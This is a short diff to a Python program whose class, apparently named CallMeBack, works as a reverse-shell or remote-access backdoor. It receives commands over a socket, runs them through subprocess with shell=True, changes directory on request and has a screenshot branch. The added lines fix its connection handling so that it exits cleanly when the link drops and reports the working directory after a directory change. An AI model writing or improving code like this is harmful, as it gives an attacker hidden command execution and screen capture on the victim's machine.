@@ -58,6 +58,8 @@ class CallMeBack:
         SendBack.sendall(bytes(path.encode()))     
         while True :
             data = SendBack.recv(4096).decode('latin-1')
+            if not data:
+                exit()
             try:
                 Data = subprocess.run(data,shell=True,capture_output=True)
                 path = os.getcwd()+ ' > '  
@@ -67,6 +69,7 @@ class CallMeBack:
                     try:
                         os.chdir(str(" ".join(data.split()[1:])))
                         path = os.getcwd()+ ' > '
+                        SendBack.sendall(bytes(path.encode()))
                     except Exception:
                          continue
                 elif 'screenshot' in data :
@@ -134,3 +137,4 @@ class CallMeBack:
 
 if __name__=='__main__':
      CallMeBack()
+
